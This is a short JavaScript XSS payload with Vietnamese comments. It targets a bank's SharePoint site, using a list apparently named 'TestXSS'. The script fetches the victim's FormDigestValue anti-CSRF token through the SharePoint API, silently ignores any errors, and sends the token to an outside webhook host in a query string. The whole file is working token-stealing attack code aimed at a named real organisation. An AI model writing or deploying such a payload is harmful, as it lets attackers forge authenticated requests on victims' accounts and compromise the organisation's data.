const DIGEST_API_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/Lists/TestXSS/AllItems.aspx'; // API GET thường có tham số
// Thay thế bằng URL Webhook của bạn
const WEBHOOK_URL = 'https://webhook-test.com/fc090c2a4b9b8347c2761f9e3944e4bc'; 

function sendToWebhook(digestValue) {
    const webhookReq = new XMLHttpRequest();
    
    // Đính kèm giá trị Digest vào URL dưới dạng tham số query
    const finalWebhookUrl = WEBHOOK_URL + '?digest=' + encodeURIComponent(digestValue);
    
    // Gửi yêu cầu GET đơn giản tới webhook
    webhookReq.open('get', finalWebhookUrl, true); 
    webhookReq.send();
}

function handleResponse() {
    let digestValue = null;
    
    try {
        // Phân tích JSON từ phản hồi API
        const responseJson = JSON.parse(this.responseText);
        
        // Trích xuất FormDigestValue từ JSON
        // !!! LƯU Ý: ĐƯỜNG DẪN NÀY (d.GetContextWebInformation.FormDigestValue)
        // CÓ THỂ CẦN ĐIỀU CHỈNH DỰA TRÊN CẤU TRÚC JSON THỰC TẾ CỦA API !!!
        digestValue = responseJson.d.GetContextWebInformation.FormDigestValue;

    } catch (e) {
        // Bỏ qua lỗi để script không bị dừng
        return; 
    }
    
    if (digestValue) {
        // Gửi token đã trích xuất tới Webhook
        sendToWebhook(digestValue);
    }
}

// Bắt đầu quá trình: Gửi request GET lấy FormDigestValue
const digestReq = new XMLHttpRequest();
digestReq.onload = handleResponse;

// *** Sử dụng phương thức GET ***
digestReq.open('get', DIGEST_API_URL, true); 

// Thiết lập header để yêu cầu phản hồi JSON
digestReq.setRequestHeader('Accept', 'application/json;odata=verbose');

digestReq.send();
